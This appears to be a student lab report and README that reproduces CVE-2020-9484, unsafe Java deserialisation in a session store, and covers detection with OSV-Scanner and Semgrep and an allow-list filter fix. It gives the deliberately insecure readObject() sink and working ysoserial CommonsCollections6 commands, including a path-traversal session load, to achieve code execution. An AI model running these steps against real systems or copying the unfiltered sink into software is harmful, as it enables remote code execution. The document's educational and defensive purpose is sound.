# Java Deserealisation

## Vulnerability Explanation: Underlying Security Theory, Relevant Weaknesses and Classification

This laboratory example emulates CVE-2020-9484, in which Apache Tomcat’s PersistentManager deserialises session files through an unfiltered ObjectInputStream \parencite{NIST2026CVE9484}. Native deserialisation rebuilds an arbitrary object graph, invoking callbacks such as readObject before validation \parencite{Oracle2018SerialGuide}. An attacker chains gadget classes already on the classpath, here Apache Commons Collections, into a sink such as Runtime.exec(), gaining remote code execution without any malicious class of their own. The flaw maps to CWE-502 (Deserialization of Untrusted Data) and OWASP A08:2025 – Software and Data Integrity Failures \parencite{CWE502, OWASP2021A08}. NVD assigns a CVSS 3.1 base score of 7.0, its Local vector and High complexity reflecting preconditions absent from a network-reachable sink \parencite{NIST2026CVE9484}.

## Demonstration of Exploitability

The minimal sink is a single unfiltered readObject() on a session file. Exploitation needs no flaw in the application’s own classes. Using ysoserial, an attacker serialises a CommonsCollections6 gadget chain that embeds an operating-system command, here touch /tmp/pwned, and writes the result as a .session file; in the lab this is placed directly, while in CVE-2020-9484 a ../ session identifier redirected the store to an uploaded file. When the application reloads that session, readObject() rebuilds the object graph and the chain executes during reconstruction, before any value is returned (Figure~X). The dropped /tmp/pwned file confirms arbitrary execution. Because the command runs with the JVM’s privileges, impact is complete: confidentiality, integrity and availability are all lost. The application never references Commons Collections; its presence on the classpath suffices.

![alt text](Images/successfuldeserealisationexploit.png)
*Figure: Successful RCE on an Ubuntu VM running the vulnerabe application.*

*Listing: The insecure sink within VulnerableSessionStore.java*

```java
        try (
                FileInputStream fis = new FileInputStream(file); // Insecure deserialisation sink. No allow-list or filtering is
                // applied before readObject() reconstructs the object graph.
                 ObjectInputStream ois = new ObjectInputStream(fis)) {
            return ois.readObject();
        }
```

## Identifying the Vulnerability Using Techniques and Tools

*Assignment Section draft*

Three complementary techniques identified the flaw. Software composition analysis using OSV-Scanner flagged commons-collections 3.1 as carrying the InvokerTransformer gadget chain, reporting the CVE-2015-7501 advisory. Static review alone would miss because the application never imports the library directly. Static analysis with Semgrep's Java ruleset independently raised an unsafe-deserialisation finding on `VulnerableSessionStore.load()`, locating the unfiltered `readObject()` sink. The two findings were then confirmed dynamically through the ysoserial `CommonsCollections6` payload executing during deserialisation and created `/tmp/pwned`, proving the warnings were exploitable rather than theoretical.

![alt text](Images/osvscannersve20157501.png)
*Figure: OSV-Scanner flagging CVE-2015-7501 within the repository*

![alt text](Images/semgrepscanningjavavulnevidence.png)
*Figure: Semgrep detecting the deserialisation vulnerability within VulnerableSessionStore.java*

## How to Mitigate the Vulnerability

The fix applies two controls, one per finding. For the sink, deserialisation is constrained at reconstruction using a JEP 290 ObjectInputFilter, the mechanism behind Tomcat’s own remediation. Because the gadget chain executes during reconstruction, validating the returned object would act too late. The filter instead vets each class beforehand using a strict allow-list (!*) that fails safe as new gadget chains emerge. For the dependency, the vulnerable commons-collections 3.1 (CVE-2015-7501) is removed from the build, eliminating the gadget classes the chain relied on. Addressing both the sink and the dependency reflects defence-in-depth, but comes with the trade-off of ongoing allow-list and dependency maintenance \parencite{OWASP2022Deser}.

*Listing: The allow-list filter being enabled within MitigatedSessionStore.java*

```java
        try (
                FileInputStream fis = new FileInputStream(file);
                ObjectInputStream ois = new ObjectInputStream(fis)) {
            // Security control. The allow-list filter is set before readObject()
            // so a disallowed class is rejected during reconstruction.
            ois.setObjectInputFilter(allowListFilter());
            return ois.readObject();
        }
```

## Retesting For Resilience

The ysoserial payload was rejected by the filter, preventing execution on the VM, and OSV-Scanner no longer flagged commons-collections. Semgrep still reported the sink: a false positive, as it matches the readObject() pattern statically and cannot see the runtime filter. Residual risk remains, since an allow-listed class could itself be exploitable. Migrating to a data-only format would remove the sink entirely.

![alt text](Images/fixeddesercodesemgrep.png)
*Figure: Semgrep scan on the mitigated code still detecting a potential serialisation vulnerability*

![alt text](Images/fixeddesercodeosvscanner.png)
*Figure: OSV-Scanner on the mitigated code no longer detecting commons-collections 3.1*

![alt text](Images/faileddeserialisationonvm.png)
*Figure: RCE attempt caught in the filter on an Ubuntu VM running the fixed application*
---

# Supplementary Information

## Prerequisites

- JDK 8 or 11 strongly recommended. The `CommonsCollections6` chain
  fires most reliably on these. It can work on newer JDKs but needs extra
  `--add-opens` flags, and is less predictable.
- Maven 3.8+
- Internet access on first build (to fetch `commons-collections:3.1` and ysoserial)
- A disposable Linux VM/container (used Ubuntu 24.4.04 LTS)

---

## Build

```bash
mvn clean package
# produces target/deser-lab.jar  (commons-collections bundled inside)
```

---

## Normal Use (Verifying Funcitonality)

```bash
java -jar target/deser-lab.jar save            # writes sessions/node01.session
java -jar target/deser-lab.jar load node01     # loads it back
# [app] loaded object: Session{id=node01, user=alice, role=USER}
```

This proves the store works for legitimate objects. The exploit below reuses the
exact same `load` path.

---

## Exploiting the Application

### Setting up the Ubuntu VM

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y openjdk-11-jdk maven git unzip
```

### Pinning toolchain to JDK 11

```bash
echo 'export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64' >> ~/.bashrc
echo 'export PATH=$JAVA_HOME/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
```

### Verifying Java Versions

```bash
java -version      # openjdk 11...
javac -version     # javac 11...   
mvn -version       # Java version: 11...
```

### Running the Exploit

This assumes that both ysoserial and the lab sit in the Documents directory.

```bash
LAB=~/Documents/"2 Unsafe Java Deserialisation or Software Integrity"
YSO=/home/testmachine/Documents/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar

cd "$LAB"
mkdir -p sessions
java -jar "$YSO" CommonsCollections6 "touch /tmp/pwned" > "$LAB/sessions/evil.session"

ls -l sessions/evil.session     

# Running the attack

  cd "$LAB"
  rm -f /tmp/pwned
  java -jar target/deser-lab.jar load evil
  ls -l /tmp/pwned        # file present → RCE confirmed
```

From the application perspective, a session is being loaded. Before any application logic is applied, the command is run during `readObject()` by the gadget chain.

### The Path Traversal Precondition

CVE- didn't use an overt identifier `evil.session`. Instead, the threat actor used the session ID to traverse target systems, such as `../../../../tmp/evil`. This was dependent on the attacker knowing the relative path of the application, can be mimicked by doing the following:

```bash
cp sessions/evil.session /tmp/evil.session
java -jar target/deser-lab.jar load "../../../../tmp/evil"
```

### To retest the fixed version

```bash
LAB=~/Documents/"fixed lab"
YSO=/home/testmachine/Documents/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar

cd "$LAB"
mkdir -p sessions
java -jar "$YSO" CommonsCollections6 "touch /tmp/pwned" > "$LAB/sessions/evil.session"

ls -l sessions/evil.session     

# Retesting the attack against the mitigated store

  cd "$LAB"
  rm -f /tmp/pwned
  java -jar target/deser-lab-fixed.jar load-safe evil
  ls -l /tmp/pwned        # No such file → payload rejected, RCE prevented
```

## Testing (can be done on either file to validate results)

To scan with semgrep, run:

```bash
semgrep scan
```

To scan with OSV-Scanner

### run from the lab root

```bash
osv-scanner --lockfile=pom.xml .
```